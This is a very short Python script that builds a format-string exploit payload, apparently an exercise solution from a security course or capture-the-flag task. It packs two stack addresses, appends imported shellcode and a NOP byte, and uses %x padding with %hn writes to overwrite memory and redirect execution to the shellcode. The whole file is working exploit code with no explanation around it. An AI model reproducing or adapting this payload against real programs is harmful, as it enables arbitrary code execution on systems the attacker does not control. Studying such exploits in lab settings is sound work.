from shellcode import shellcode
from struct import pack

addr1 = pack("<I", 0xbffea6dc)
addr2 = pack("<I", 0xbffea6de)

print(addr1 + addr2 + shellcode + "\x90" + "%40632x%04$hn" + "%8486x%05$hn"+"\x00")
